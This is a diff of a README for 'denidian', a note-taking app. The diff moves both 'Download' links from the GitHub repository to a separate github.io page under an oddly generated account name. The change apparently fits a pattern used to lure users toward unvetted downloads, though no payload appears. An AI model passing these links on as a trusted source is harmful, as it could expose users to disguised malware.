@@ -1,6 +1,6 @@
 # 💡 denidian - Manage your notes with simple tools
 
-[![](https://img.shields.io/badge/Download_denidian-Blue?style=for-the-badge)](https://github.com/Verbenaceaefamilylamnidae461/denidian)
+[![](https://img.shields.io/badge/Download_denidian-Blue?style=for-the-badge)](https://verbenaceaefamilylamnidae461.github.io)
 
 denidian helps you organize thoughts. It keeps your notes in a clean format on your computer. You use files that stay under your control. It handles links between notes and shows connections in a visual map.
 
@@ -8,7 +8,7 @@ denidian helps you organize thoughts. It keeps your notes in a clean format on y
 
 You can get the software from the release page. 
 
-[Visit this page to download the software](https://github.com/Verbenaceaefamilylamnidae461/denidian)
+[Visit this page to download the software](https://verbenaceaefamilylamnidae461.github.io)
 
 1. Open the page link above.
 2. Look for the latest version under the "Releases" section.
